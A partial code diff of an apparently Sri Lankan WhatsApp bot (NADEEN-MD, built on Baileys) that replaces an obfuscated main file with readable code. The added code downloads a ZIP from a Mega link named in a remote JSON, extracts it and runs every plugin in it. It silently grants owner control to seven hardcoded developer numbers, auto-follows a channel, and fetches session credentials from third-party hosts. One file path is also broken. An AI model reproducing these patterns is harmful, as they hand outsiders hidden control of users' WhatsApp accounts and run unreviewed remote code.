@@ -1,723 +1,780 @@
-const _0x1b7d27 = _0x1e62;
-(function(_0xb9ff8f, _0x111b93) {
-  const _0x190c74 = _0x1e62
-    , _0xf4cd2c = _0xb9ff8f();
-  while (!![]) {
-    try {
-      const _0x378caa = parseInt(_0x190c74(0x194)) / 0x1 + -parseInt(_0x190c74(0x15a)) / 0x2 + parseInt(_0x190c74(0x17b)) / 0x3 * (-parseInt(_0x190c74(0x9f)) / 0x4) + -parseInt(_0x190c74(0x1ab)) / 0x5 * (-parseInt(_0x190c74(0xd1)) / 0x6) + -parseInt(_0x190c74(0x136)) / 0x7 * (parseInt(_0x190c74(0x122)) / 0x8) + -parseInt(_0x190c74(0x156)) / 0x9 + parseInt(_0x190c74(0x123)) / 0xa * (parseInt(_0x190c74(0x1ba)) / 0xb);
-      if (_0x378caa === _0x111b93) break;
-      else _0xf4cd2c['push'](_0xf4cd2c['shift']());
-    } catch (_0x384885) {
-      _0xf4cd2c['push'](_0xf4cd2c['shift']());
-    }
-  }
-}(_0x3cf6, 0x638dc));
 const {
-  default: makeWASocket
-  , getAggregateVotesInPollMessage
-  , useMultiFileAuthState
-  , DisconnectReason
-  , getDevice
-  , fetchLatestBaileysVersion
-  , jidNormalizedUser
-  , getContentType
-  , Browsers
-  , makeInMemoryStore
-  , makeCacheableSignalKeyStore
-  , downloadContentFromMessage
-  , generateForwardMessageContent
-  , generateWAMessageFromContent
-  , prepareWAMessageMedia
-  , proto
-} = require('@whiskeysockets/baileys'), fs = require('fs'), P = require(_0x1b7d27(0xe4)), config = require(_0x1b7d27(0x7d)), qrcode = require(_0x1b7d27(0x18c)), NodeCache = require(_0x1b7d27(0xe9)), util = require(_0x1b7d27(0x17d)), axios = require(_0x1b7d27(0x1ad)), {
-  File
-} = require(_0x1b7d27(0x130)), path = require(_0x1b7d27(0x16a)), msgRetryCounterCache = new NodeCache(), FileType = require('file-type'), l = console['log'], SESSION_DIR = './' + config[_0x1b7d27(0x161)];
-!fs['existsSync'](SESSION_DIR) && fs[_0x1b7d27(0x1b8)](SESSION_DIR);
-const df = __dirname + ('/' + config[_0x1b7d27(0x161)] + _0x1b7d27(0xf9));
+    default: makeWASocket,
+    getAggregateVotesInPollMessage, 
+    useMultiFileAuthState,
+    DisconnectReason,
+    getDevice,
+    fetchLatestBaileysVersion,
+    jidNormalizedUser,
+    getContentType,
+    Browsers,
+    makeInMemoryStore,
+    makeCacheableSignalKeyStore,
+    downloadContentFromMessage,
+    generateForwardMessageContent,
+    generateWAMessageFromContent,
+    prepareWAMessageMedia,
+    proto
+} = require('@whiskeysockets/baileys')
+const fs = require('fs')
+const P = require('pino')
+const config = require('./config')
+const qrcode = require('qrcode-terminal')
+const NodeCache = require('node-cache')
+const util = require('util')
+const axios = require('axios')
+const { File } = require('megajs')
+const path = require('path')
+const msgRetryCounterCache = new NodeCache()
 
-function _0x1e62(_0x55ce6e, _0x11fb54) {
-  const _0x3cf6d2 = _0x3cf6();
-  return _0x1e62 = function(_0x1e623a, _0x6dbff6) {
-    _0x1e623a = _0x1e623a - 0x6b;
-    let _0x130934 = _0x3cf6d2[_0x1e623a];
-    return _0x130934;
-  }, _0x1e62(_0x55ce6e, _0x11fb54);
-}
-if (!fs['existsSync'](df)) {
-  if (config[_0x1b7d27(0x9e)]) {
-    const sessdata = config[_0x1b7d27(0x9e)][_0x1b7d27(0xe8)](_0x1b7d27(0xa1), '');
-    if (sessdata['includes']('#')) {
-      const filer = File[_0x1b7d27(0xec)](_0x1b7d27(0xd0) + sessdata);
-      filer[_0x1b7d27(0xd9)]((_0x2536b5, _0x4ab27a) => {
-        const _0x10edca = _0x1b7d27;
-        if (_0x2536b5) throw _0x2536b5;
-        fs[_0x10edca(0x18f)](df, _0x4ab27a, () => {
-          const _0xf87220 = _0x10edca;
-          console['log'](_0xf87220(0xe2));
+const FileType = require('file-type')
+const l = console.log
+
+
+const ownerNumber = [`94755527010`];
+//===================SESSION======.=======================
+
+const df = __dirname + '/${config.SESSION_NAME}/creds.json';
+
+if (!fs.existsSync(df)) {
+  if (config.SESSION_ID) {
+    const sessdata = config.SESSION_ID.replace("𝙽𝙰𝙳𝙴𝙴𝙽-𝙼𝙳=", "");
+
+    if (sessdata.includes("#")) {
+      const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
+      filer.download((err, data) => {
+        if (err) throw err;
+        fs.writeFile(df, data, () => {
+          console.log("✅ Mega session download completed !!");
         });
       });
-    } else downloadSession(sessdata, df);
+    } else {
+      (async () => {
+        await downloadSession(sessdata, df);
+      })();
+    }
   }
 }
-async function downloadSession(_0x4812b2, _0x2d95ec) {
-  const _0xea24da = _0x1b7d27
-    , _0x152784 = [_0xea24da(0xa6), _0xea24da(0x180)];
-  let _0x4fc040 = ![];
-  for (let _0x5e16c1 = 0x0; _0x5e16c1 < _0x152784[_0xea24da(0x1b4)]; _0x5e16c1++) {
-    const _0x5adf85 = _0x152784[_0x5e16c1] + 'SESSIONS/' + _0x4812b2;
-    console[_0xea24da(0xfa)](_0xea24da(0x183) + (_0x5e16c1 + 0x1) + ')');
+
+async function downloadSession(sessdata, df) {
+  const dbUrls = [
+    'https://saviya-kolla-database.koyeb.app/',
+    'https://saviya-kolla-database.vercel.app/'
+  ];
+
+  let success = false;
+
+  for (let i = 0; i < dbUrls.length; i++) {
+    const sessionUrl = `${dbUrls[i]}SESSIONS/${sessdata}`;
+    console.log(`📥 Downloading session from NADEEN-DB`);
+
     try {
-      const _0x51f918 = await axios[_0xea24da(0x114)](_0x5adf85);
-      if (_0x51f918[_0xea24da(0x174)] && Object[_0xea24da(0x178)](_0x51f918['data'])[_0xea24da(0x1b4)] > 0x0) {
-        await sleep(0x3e8), fs[_0xea24da(0xa0)](_0x2d95ec, JSON['stringify'](_0x51f918[_0xea24da(0x174)], null, 0x2)), console['log'](_0xea24da(0xf4) + (_0x5e16c1 + 0x1) + _0xea24da(0x195)), _0x4fc040 = !![];
+      const response = await axios.get(sessionUrl);
+
+      if (response.data && Object.keys(response.data).length > 0) {
+        await sleep(1000);
+        fs.writeFileSync(df, JSON.stringify(response.data, null, 2));
+        console.log(`✅ Session file save successfully`);
+        success = true;
         break;
-      } else console[_0xea24da(0xfe)]('⚠️ Empty or invalid session data from DB-' + (_0x5e16c1 + 0x1) + _0xea24da(0x115));
-    } catch (_0x596d62) {
-      console[_0xea24da(0x1a1)](_0xea24da(0x164) + (_0x5e16c1 + 0x1) + ': ' + _0x596d62[_0xea24da(0x19d)]);
+      } else {
+        console.warn(`⚠️ Empty or invalid session data from DB-${i + 1}, attempting next DB...`);
+      }
+
+    } catch (err) {
+      console.error(`❌ Failed to download local DB session file: ${err.message}`);
     }
-  }!_0x4fc040 && console['error'](_0xea24da(0x17c));
+  }
+
+  if (!success) {
+    console.error("❌ All DB servers failed to provide a valid session file.");
+  }
 }
-const express = require(_0x1b7d27(0x170))
-  , app = express()
-  , port = process['env'][_0x1b7d27(0x15c)] || config[_0x1b7d27(0x15c)]
-  , {
-    exec
-  } = require(_0x1b7d27(0xca))
-  , AdmZip = require(_0x1b7d27(0xa4))
-  , PLUGINS_DIR = './plugins'
-  , LIB_DIR = _0x1b7d27(0x165)
-  , DATA_DIR = './data'
-  , ZIP_DIR = './'
-  , connect = async () => {
-    const _0x3343c4 = _0x1b7d27;
-    let _0x56620b = await axios[_0x3343c4(0x114)]('https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/nadeen-md.json');
-    const _0x585124 = '' + _0x56620b[_0x3343c4(0x174)]['megaurl2'];
-    !fs[_0x3343c4(0x147)](PLUGINS_DIR) && fs[_0x3343c4(0x1b8)](PLUGINS_DIR, {
-      'recursive': !![]
-    });
-    fs[_0x3343c4(0x147)](DATA_DIR) && fs[_0x3343c4(0xda)](DATA_DIR, {
-      'recursive': !![]
-      , 'force': !![]
-    });
-    !fs[_0x3343c4(0x147)](LIB_DIR) && fs[_0x3343c4(0x1b8)](LIB_DIR, {
-      'recursive': !![]
-    });
-    console[_0x3343c4(0xfa)](_0x3343c4(0x19f));
-    const _0x19804a = File[_0x3343c4(0xec)]('' + _0x585124)
-      , _0x5ac7b9 = await _0x19804a[_0x3343c4(0x138)]()
-      , _0x3ca1cd = path[_0x3343c4(0xd7)](__dirname, _0x3343c4(0x113));
-    fs[_0x3343c4(0xa0)](_0x3ca1cd, _0x5ac7b9), console[_0x3343c4(0xfa)](_0x3343c4(0x84));
-    const _0x34fe4b = new AdmZip(_0x3ca1cd);
-    _0x34fe4b[_0x3343c4(0xc5)](ZIP_DIR, !![]), console['log'](_0x3343c4(0x153)), console[_0x3343c4(0xfa)]('Lib extracted successfully ✅'), console['log']('Installing plugins 🔌... '), fs[_0x3343c4(0x92)](_0x3343c4(0x191))[_0x3343c4(0x13d)](_0xed8a13 => {
-      const _0x403ec1 = _0x3343c4;
-      path[_0x403ec1(0x91)](_0xed8a13)[_0x403ec1(0x154)]() == _0x403ec1(0x121) && require(_0x403ec1(0x191) + _0xed8a13);
-    }), fs['unlinkSync'](_0x3ca1cd);
-    const {
-      sleep: _0x34ee32
-    } = require('./lib/functions');
-    var {
-      connectdb: _0x4e8131
-      , updb: _0x5e10ba
-    } = require('./lib/database');
-    await _0x4e8131(), await _0x5e10ba(), console[_0x3343c4(0xfa)](_0x3343c4(0x70)), await _0x34ee32(0xbb8), await connectToWA();
-  };
+
+// <<==========PORTS============>>
+const express = require("express");
+const app = express();
+const port = process.env.PORT || 8000;
+
+const { exec } = require('child_process');
+    const AdmZip = require('adm-zip'); // Import AdmZip for extraction
+    //=========================dl-ZIP========================
+
+const PLUGINS_DIR = './plugins'; // Directory where plugins will be extracted
+const LIB_DIR = './lib';
+const DATA_DIR = './data';
+ const ZIP_DIR = './'
+
+
+
+
+ 
+	
+
+
+const connect = async () => {
+ let ZIP = await axios.get('https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/nadeen-md.json');
+    //console.log(ZIP.data); 
+
+// Assuming the correct property is `ZIP.data.enc` (adjust based on actual response structure)
+const MEGA_ZIP_LINK = `${ZIP.data.megaurl}`;  // Replace with your Mega ZIP file link
+    // Ensure the plugins directory exists
+    if (!fs.existsSync(PLUGINS_DIR)) {
+      fs.mkdirSync(PLUGINS_DIR, { recursive: true });
+    }
+    if (fs.existsSync(DATA_DIR)) {
+        fs.rmSync(DATA_DIR, { recursive: true, force: true });
+      }
+    if (!fs.existsSync(LIB_DIR)) {
+        fs.mkdirSync(LIB_DIR, { recursive: true });
+      }
+
+    console.log('Fetching ZIP file from Mega.nz...');
+
+    // Download the ZIP file from Mega.nz
+    const file = File.fromURL(`${MEGA_ZIP_LINK}`);
+    const fileData = await file.downloadBuffer();
+
+    // Save the ZIP file to a temporary location
+    const tempZipPath = path.join(__dirname, 'temp.zip');
+    fs.writeFileSync(tempZipPath, fileData);
+    console.log('VISPER ZIP file downloaded successfully ✅');
+
+    // Extract the ZIP file to the plugins directory
+    const zip = new AdmZip(tempZipPath);
+    zip.extractAllTo(ZIP_DIR, true); // Extract to the plugins directory
+
+    console.log('Plugins extracted successfully ✅');
+console.log('Lib extracted successfully ✅');
+
+ console.log('Installing plugins 🔌... ')
+            //const path = require('path');
+ //const path = require('path');
+           fs.readdirSync("./plugins/").forEach((plugin) => {
+  if (path.extname(plugin).toLowerCase() == ".js") {
+      require("./plugins/" + plugin);
+  }
+});
+
+
+
+
+
+
+	
+
+    // Clean up the temporary ZIP file
+    fs.unlinkSync(tempZipPath);
+ 
+  const {   sleep } = require('./lib/functions');
+   
+  var {  connectdb ,updb} = require("./lib/database");
+
+  //console.log('All Plugins installed ⚡');
+  await connectdb();
+  await updb();
+  console.log('NADEEN-MD CONNECTED ✅');
+  await sleep(3000)
+  await connectToWA()
+} 
+
+
+//====================================
 async function connectToWA() {
-  const _0x40247d = _0x1b7d27
-    , {
-      version: _0x26ad65
-      , isLatest: _0x5078e7
-    } = await fetchLatestBaileysVersion()
-    , {
-      getBuffer: _0x751165
-      , getGroupAdmins: _0x53dcaf
-      , getRandom: _0x4d32a6
-      , sleep: _0x22c2e2
-      , fetchJson: _0x7a6b25
-    } = require(_0x40247d(0x15f))
-    , {
-      sms: _0x1b6df1
-    } = require(_0x40247d(0x14b));
-  var {
-    updateCMDStore: _0xa22585
-    , isbtnID: _0x113cf5
-    , getCMDStore: _0x17f45b
-    , getCmdForCmdId: _0x1ec342
-    , input: _0x4f7215
-    , get: _0x53a24a
-    , getalls: _0x35df48
-    , updfb: _0x1958f7
-    , upresbtn: _0x11f66d
-  } = require('./lib/database');
-  const _0x848588 = config[_0x40247d(0x1b3)]
-    , _0x3b9000 = config[_0x40247d(0x76)]
-    , _0x11b61d = config['ONLY_GROUP']
-    , _0x402748 = config['ANTI_CALL']
-    , _0x5cb349 = config[_0x40247d(0x13e)]
-    , _0x17ceec = config[_0x40247d(0xf3)]
-    , _0x346eee = config['ANTI_LINK']
-    , _0x12a2e8 = config['AUTO_TYPING']
-    , _0x26ab78 = config['ANTI_BOT']
-    , _0x3c665f = config[_0x40247d(0x1c0)]
-    , _0x34f06d = config['CMD_ONLY_READ']
-    , _0x4c33ec = config[_0x40247d(0x7b)]
-    , _0x4d0ab2 = config[_0x40247d(0xa3)]
-    , _0x4f719e = config[_0x40247d(0xe7)]
-    , _0x2a242b = (await axios['get'](_0x40247d(0x71)))['data']
-    , _0x464ceb = '' + _0x2a242b[_0x40247d(0x159)]
-    , _0x415359 = '' + _0x2a242b[_0x40247d(0x129)]
-    , {
-      state: _0x2427b2
-      , saveCreds: _0xfe11da
-    } = await useMultiFileAuthState(__dirname + ('/' + config[_0x40247d(0x161)] + '/'))
-    , _0x55533e = makeWASocket({
-      'logger': P({
-        'level': 'fatal'
-      })['child']({
-        'level': _0x40247d(0x184)
-      })
-      , 'printQRInTerminal': !![]
-      , 'generateHighQualityLinkPreview': !![]
-      , 'auth': _0x2427b2
-      , 'defaultQueryTimeoutMs': undefined
-      , 'msgRetryCounterCache': msgRetryCounterCache
-    });
-  _0x55533e['ev']['on'](_0x40247d(0x131), async _0x3fd222 => {
-    const _0x4c3927 = _0x40247d
-      , {
-        connection: _0x9fdb01
-        , lastDisconnect: _0x562ab8
-      } = _0x3fd222;
-    if (_0x9fdb01 === _0x4c3927(0x1ac)) {
-      const _0x515a75 = _0x562ab8?.[_0x4c3927(0x1a1)]?.[_0x4c3927(0x16b)]?.[_0x4c3927(0x90)] !== DisconnectReason[_0x4c3927(0xaf)];
-      console[_0x4c3927(0xfa)]('❌ Disconnected: ' + (_0x562ab8?.[_0x4c3927(0x1a1)]?.[_0x4c3927(0x19d)] || _0x4c3927(0x1bf)) + ' (' + (_0x515a75 ? _0x4c3927(0x19c) : 'Logged out') + ')'), _0x515a75 && connectToWA();
-    } else _0x9fdb01 === _0x4c3927(0x83) && (console[_0x4c3927(0xfa)](_0x4c3927(0x16c)), setTimeout(async () => {
-      const _0x2ded73 = _0x4c3927;
-      try {
-        const _0x527ddf = _0x4f719e[0x0][_0x2ded73(0x8f)](_0x2ded73(0x18d)) ? _0x4f719e[0x0] : _0x4f719e[0x0] + _0x2ded73(0x18d);
-        let _0x352fbf = _0x2ded73(0x11a);
-        try {
-          const _0x57d14d = await axios['get'](_0x2ded73(0x71))
-            , _0x5ec5cc = _0x57d14d[_0x2ded73(0x174)];
-          _0x352fbf = _0x5ec5cc?.['connectmg'] || _0x352fbf;
-        } catch (_0x2eadab) {
-          console['warn'](_0x2ded73(0xb1), _0x2eadab[_0x2ded73(0x19d)]);
-        }
-        await _0x55533e[_0x2ded73(0x199)](_0x2ded73(0x143), {
-          'image': {
-            'url': 'https://files.catbox.moe/3mvn78.png'
+const { version, isLatest } = await fetchLatestBaileysVersion();
+const { getBuffer, getGroupAdmins, getRandom,   sleep, fetchJson} = require('./lib/functions');
+const { sms } = require('./lib/msg');
+var {
+  updateCMDStore,
+  isbtnID,
+  getCMDStore,
+  getCmdForCmdId,
+  
+  input,
+  get,
+  getalls,
+ 
+  updfb,
+  upresbtn,
+} = require("./lib/database");
+
+    
+	
+
+  
+  
+    
+    
+  const prefix = config.PREFIX
+  //const aliveMsg = config.ALIVE_MSG
+  const autoreadStatus = config.AUTO_READ_STATUS
+  const mode = config.ONLY_GROUP
+  const call = config.ANTI_CALL
+  const block = config.AUTO_BLOCK
+  const badword = config.ANTI_BAD
+  const antilink = config.ANTI_LINK
+  const ty = config.AUTO_TYPING		
+  const antiBot = config.ANTI_BOT
+  const readall = config.AUTO_MSG_READ
+  const readCmd = config.CMD_ONLY_READ
+  const recording = config.AUTO_RECORDING
+  const autoReact = config.AUTO_REACT 
+  const ownerNumber = config.OWNER_NUMBER
+  
+  const ownerdataa = (await axios.get('https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/nadeen-md.json')).data
+       
+        
+  const captionText = `${ownerdataa.connectmg}`;
+  
+  const imageUrl = `${ownerdataa.cmsglogo}`;
+  
+    //console.log(`using WA v${version.join('.')}, isLatest: ${isLatest}`)
+    const {
+        state,
+        saveCreds
+    } = await useMultiFileAuthState(__dirname + `/${config.SESSION_NAME}/`)
+	
+    const conn = makeWASocket({
+        logger: P({
+            level: "fatal"
+        }).child({
+            level: "fatal"
+        }),
+        printQRInTerminal: true,
+        generateHighQualityLinkPreview: true,
+        auth: state,
+        defaultQueryTimeoutMs: undefined,
+        msgRetryCounterCache
+    })
+
+
+
+       conn.ev.on('connection.update', async (update) => {
+          const { connection, lastDisconnect } = update;
+          if (connection === 'close') {
+              if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
+                  connectToWA();
+              }
+          } else if (connection === 'open') {
+             
+
+            console.log('WA CONNECTED ✅');
+const ownerdataaa = (await axios.get('https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/nadeen-md.json')).data
+     
+	    
+const glinks= `${ownerdataaa.supglink}`;
+
+const botJid = jidNormalizedUser(conn.user.id);
+
+await conn.sendMessage(
+  `${ownerNumber}@s.whatsapp.net`, 
+  { 
+    image: { url: imageUrl }, 
+    caption: captionText 
+  }
+); 
           }
-          , 'caption': _0x352fbf
-        }), console[_0x2ded73(0xfa)](_0x2ded73(0xcb));
-      } catch (_0x45ba6c) {
-        console['error'](_0x2ded73(0x124), _0x45ba6c[_0x2ded73(0x19d)]);
-      }
-    }, 0x7d0));
-  }), _0x55533e['ev']['on'](_0x40247d(0xdd), _0xfe11da), _0x55533e['ev']['on'](_0x40247d(0x1b7), async _0x4b9a40 => {
-    const _0x297513 = _0x40247d;
+      });
+
+
+
+
+
+  conn.ev.on('creds.update', saveCreds)
+  conn.ev.on('messages.upsert', async (mek) => {
     try {
-      async function _0x33645f() {
-        const _0x483dc7 = await _0x35df48();
-        _0x483dc7 && Object['assign'](config, _0x483dc7);
+
+async function loadConfig() {
+  const settings = await getalls(); 
+  if (settings) {
+    Object.assign(config, settings); 
+  }
+}
+
+loadConfig().catch(console.error);
+	    
+mek = mek.messages[0];
+if (!mek.message) return;
+
+// ephemeral message නම් unwrap කරමු
+mek.message = (getContentType(mek.message) === 'ephemeralMessage')
+  ? mek.message.ephemeralMessage.message
+  : mek.message;
+
+// ✅ Only if AUTO_READ_STATUS === "true" do anything
+if (!mek.message) return	
+mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
+if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_READ_STATUS === "true"){
+  const emojis = ['🧩', '🍉', '💜', '🌸', '🪴', '💊', '💫', '🍂', '🌟', '🎋', '😶‍🌫️', '🫀', '🧿', '👀', '🤖', '🚩', '🥰', '🗿', '💜', '💙', '🌝', '🖤', '💚'];
+  const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
+
+	
+await conn.readMessages([mek.key])  
+const mnyako = await jidNormalizedUser(conn.user.id)
+await conn.sendMessage(mek.key.remoteJid, { react: { key: mek.key, text: randomEmoji} }, { statusJidList: [mek.key.participant, mnyako] })
+}	      
+	    if (mek.key && mek.key.remoteJid === 'status@broadcast') return
+
+
+const metadata = await conn.newsletterMetadata("jid", `${ownerdataa.mainchanal}`)	      
+if (metadata.viewer_metadata === null){
+await conn.newsletterFollow(`${ownerdataa.mainchanal}`)
+console.log("NADEEN MD WA CHANNEL FOLLOW ✅")
+}	 
+    
+const m = sms(conn, mek)
+const type = getContentType(mek.message)
+const content = JSON.stringify(mek.message)
+const from = mek.key.remoteJid
+const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
+const body = 
+  (type === 'conversation') ? mek.message.conversation :
+  (type === 'extendedTextMessage' && mek.message.extendedTextMessage?.contextInfo?.quotedMessage &&
+   await isbtnID(mek.message.extendedTextMessage.contextInfo.stanzaId)) ?
+    await getCmdForCmdId(
+      await getCMDStore(mek.message.extendedTextMessage.contextInfo.stanzaId),
+      mek.message.extendedTextMessage.text
+    ) :
+  (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text :
+  (type === 'templateButtonReplyMessage') ? mek.message.templateButtonReplyMessage?.selectedId :
+  (type === 'interactiveResponseMessage') ? (() => {
+    try {
+      const json = JSON.parse(mek.message.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson);
+      return json?.id || '';
+    } catch { return ''; }
+  })() :
+  (type === 'imageMessage' && mek.message.imageMessage?.caption) ? mek.message.imageMessage.caption :
+  (type === 'videoMessage' && mek.message.videoMessage?.caption) ? mek.message.videoMessage.caption :
+  // fallback for unknown or malformed types
+  m.msg?.text ||
+  m.msg?.conversation ||
+  m.msg?.caption ||
+  m.message?.conversation ||
+  m.msg?.selectedButtonId ||
+  m.msg?.singleSelectReply?.selectedRowId ||
+  m.msg?.selectedId ||
+  m.msg?.contentText ||
+  m.msg?.selectedDisplayText ||
+  m.msg?.title ||
+  m.msg?.name ||
+  '';
+
+
+const prefix = config.PREFIX;  
+const isCmd = body.startsWith(prefix)
+const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
+const args = body.trim().split(/ +/).slice(1)
+const q = args.join(' ')
+const isGroup = from.endsWith('@g.us')
+const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
+const senderNumber = sender.split('@')[0]
+const botNumber = conn.user.id.split(':')[0]
+const pushname = mek.pushName || 'Sin Nombre'
+const developers = `94711451319,94716769285,94779483535,94728840491,94755527010,94715973437,94775383340`
+const mokakhri = developers.split(",")
+const isbot = botNumber.includes(senderNumber)
+const isdev = mokakhri.includes(senderNumber)
+const isMe = isbot ? isbot : isdev 
+const isOwner = ownerNumber.includes(senderNumber) || isMe
+const botNumber2 = await jidNormalizedUser(conn.user.id);
+const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => null) : null;
+const groupName = isGroup && groupMetadata ? groupMetadata.subject : '';
+const participants = isGroup && groupMetadata ? groupMetadata.participants : [];
+const groupAdmins = isGroup ? getGroupAdmins(participants) : [];
+const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
+const isAdmins = isGroup ? groupAdmins.includes(sender) : false
+ const isReact = m.message.reactionMessage ? true : false
+const isAnti = (teks) => {
+let getdata = teks
+for (let i=0;i<getdata.length;i++) {
+if(getdata[i] === from) return true
+}
+return false
+}
+
+const reply = async(teks) => {
+  return await conn.sendMessage(from, { text: teks }, { quoted: mek })
+}
+conn.replyad = async (teks) => {
+  await conn.sendMessage(from, { text: teks }, { quoted: mek })
+}
+const NON_BUTTON = true // Implement a switch to on/off this feature...
+conn.buttonMessage2 = async (jid, msgData,quotemek) => {
+  if (!NON_BUTTON) {
+    await conn.sendMessage(jid, msgData)
+  } else if (NON_BUTTON) {
+    let result = "";
+    const CMD_ID_MAP = []
+    msgData.buttons.forEach((button, bttnIndex) => {
+const mainNumber = `${bttnIndex + 1}`;
+result += `\n*${mainNumber} ||*  ${button.buttonText.displayText}`;
+
+CMD_ID_MAP.push({ cmdId: mainNumber, cmd: button.buttonId });
+    });
+
+    if (msgData.headerType === 1) {
+const buttonMessage = `${msgData.text}\n\n*\`Reply Below Number 🔢\`*\n${result}\n\n${msgData.footer}`
+const textmsg = await conn.sendMessage(from, { text: buttonMessage ,
+}, { quoted: quotemek || mek})
+await updateCMDStore(textmsg.key.id, CMD_ID_MAP);
+    } else if (msgData.headerType === 4) {
+const buttonMessage = `${msgData.caption}\n\n*\`Reply Below Number 🔢\`*\n${result}\n\n${msgData.footer}`
+const imgmsg = await conn.sendMessage(jid, { image: msgData.image, caption: buttonMessage ,
+}, { quoted: quotemek || mek})
+await updateCMDStore(imgmsg.key.id, CMD_ID_MAP);
+    }
+  }
+}
+
+conn.buttonMessage = async (jid, msgData, quotemek) => {
+  if (!NON_BUTTON) {
+    await conn.sendMessage(jid, msgData)
+  } else if (NON_BUTTON) {
+    let result = "";
+    const CMD_ID_MAP = []
+    msgData.buttons.forEach((button, bttnIndex) => {
+const mainNumber = `${bttnIndex + 1}`;
+result += `\n*${mainNumber} ||*  ${button.buttonText.displayText}`;
+
+CMD_ID_MAP.push({ cmdId: mainNumber, cmd: button.buttonId });
+    });
+
+    if (msgData.headerType === 1) {
+const buttonMessage = `${msgData.text || msgData.caption}\n\n*Reply Below Number 🔢*\n${result}\n\n${msgData.footer}`
+const textmsg = await conn.sendMessage(from, { text: buttonMessage ,}, { quoted: quotemek || mek})
+await updateCMDStore(textmsg.key.id, CMD_ID_MAP);
+    } else if (msgData.headerType === 4) {
+const buttonMessage = `${msgData.caption}\n\n*Reply Below Number 🔢*\n${result}\n\n${msgData.footer}`
+const imgmsg = await conn.sendMessage(jid, { image: msgData.image, caption: buttonMessage ,}, { quoted: quotemek || mek})
+await updateCMDStore(imgmsg.key.id, CMD_ID_MAP);
+    }
+  }
+}
+
+   
+conn.listMessage2 = async (jid, msgData, quotemek) => {
+  if (!NON_BUTTON) {
+    await conn.sendMessage(jid, msgData)
+  } else if (NON_BUTTON) {
+    let result = "";
+    const CMD_ID_MAP = []
+
+    msgData.sections.forEach((section, sectionIndex) => {
+const mainNumber = `${sectionIndex + 1}`;
+result += `\n*${section.title}*\n\n`;
+
+section.rows.forEach((row, rowIndex) => {
+  const subNumber = `${mainNumber}.${rowIndex + 1}`;
+  const rowHeader = `*${subNumber} ||* ${row.title}`;
+  result += `${rowHeader}\n`;
+  if (row.description) {
+    result += `   ${row.description}\n\n`;
+  }
+  CMD_ID_MAP.push({ cmdId: subNumber, cmd: row.rowId });
+});
+    });
+
+    const listMessage = `${msgData.text}\n\n${msgData.buttonText},${result}\n${msgData.footer}`
+    const text = await conn.sendMessage(from, { text: listMessage ,
+}, { quoted: quotemek || mek})
+    await updateCMDStore(text.key.id, CMD_ID_MAP);
+  }
+}
+
+
+
+
+
+conn.listMessage4 = async (jid, msgData, quotemek) => {
+  if (!NON_BUTTON) {
+    await conn.sendMessage(jid, msgData);
+  } else {
+    let result = "";
+    const CMD_ID_MAP = [];
+
+    msgData.sections.forEach((section, sectionIndex) => {
+      const mainNumber = `${sectionIndex + 1}`;
+      result += `\n*${section.title}*\n\n`;
+
+      section.rows.forEach((row, rowIndex) => {
+        const subNumber = `${mainNumber}.${rowIndex + 1}`;
+        const rowHeader = `*${subNumber} ||*  ${row.title}`;
+        result += `${rowHeader}\n`;
+        if (row.description) {
+          result += `   ${row.description}\n\n`;
+        }
+        CMD_ID_MAP.push({ cmdId: subNumber, cmd: row.rowId });
+      });
+    });
+
+    const listMessage = `${msgData.text || ''}\n\n${msgData.buttonText || ''},${result}\n\n${msgData.footer || ''}`;
+
+    // Fix image handling
+    let sendPayload;
+    if (msgData.image) {
+      let imageData = msgData.image;
+
+      if (typeof imageData === 'string') {
+        imageData = { url: imageData };
+      } else if (Buffer.isBuffer(imageData)) {
+        imageData = { buffer: imageData };
+      } else if (imageData.url) {
+        imageData = { url: imageData.url };
+      } else {
+        throw new Error("Invalid image format for listMessage4.");
       }
-      _0x33645f()['catch'](console[_0x297513(0x1a1)]), _0x4b9a40 = _0x4b9a40['messages'][0x0];
-      if (!_0x4b9a40[_0x297513(0x19d)]) return;
-      _0x4b9a40[_0x297513(0x19d)] = getContentType(_0x4b9a40[_0x297513(0x19d)]) === 'ephemeralMessage' ? _0x4b9a40[_0x297513(0x19d)]['ephemeralMessage']['message'] : _0x4b9a40[_0x297513(0x19d)];
-      if (!_0x4b9a40['message']) return;
-      _0x4b9a40['message'] = getContentType(_0x4b9a40['message']) === _0x297513(0x14e) ? _0x4b9a40['message'][_0x297513(0x14e)][_0x297513(0x19d)] : _0x4b9a40['message'];
-      if (_0x4b9a40[_0x297513(0x81)] && _0x4b9a40[_0x297513(0x81)][_0x297513(0x169)] === _0x297513(0xde) && config[_0x297513(0x76)] === _0x297513(0x141)) {
-        const _0x9cfae1 = ['🧩', '🍉', '💜', '🌸', '🪴', '💊', '💫', '🍂', '🌟', '🎋', '😶‍🌫️', '🫀', '🧿', '👀', '🤖', '🚩', '🥰', '🗿', '💜', '💙', '🌝', '🖤', '💚']
-          , _0xb62b97 = _0x9cfae1[Math['floor'](Math[_0x297513(0x1c1)]() * _0x9cfae1['length'])];
-        await _0x55533e[_0x297513(0xbe)]([_0x4b9a40[_0x297513(0x81)]]);
-        const _0xe3f2e9 = await jidNormalizedUser(_0x55533e[_0x297513(0xf5)]['id']);
-        await _0x55533e[_0x297513(0x199)](_0x4b9a40['key'][_0x297513(0x169)], {
-          'react': {
-            'key': _0x4b9a40['key']
-            , 'text': _0xb62b97
-          }
-        }, {
-          'statusJidList': [_0x4b9a40[_0x297513(0x81)][_0x297513(0x11b)], _0xe3f2e9]
